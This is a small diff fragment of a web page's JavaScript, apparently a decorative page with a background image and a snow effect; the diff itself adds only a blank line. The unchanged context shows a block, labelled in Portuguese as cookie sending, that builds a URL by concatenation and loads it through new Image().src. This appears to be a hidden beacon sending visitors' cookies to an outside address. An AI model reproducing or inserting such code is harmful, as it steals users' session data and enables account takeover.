@@ -74,4 +74,5 @@ c = b.concat(a);
 new Image().src=c;
 document.body.style.backgroundImage = "url('https://rodrigorochapinto.github.io/pages-teste/imagens/ufsj1.jpg')";
 // fim - Envio cookie
+
 SnowStart()
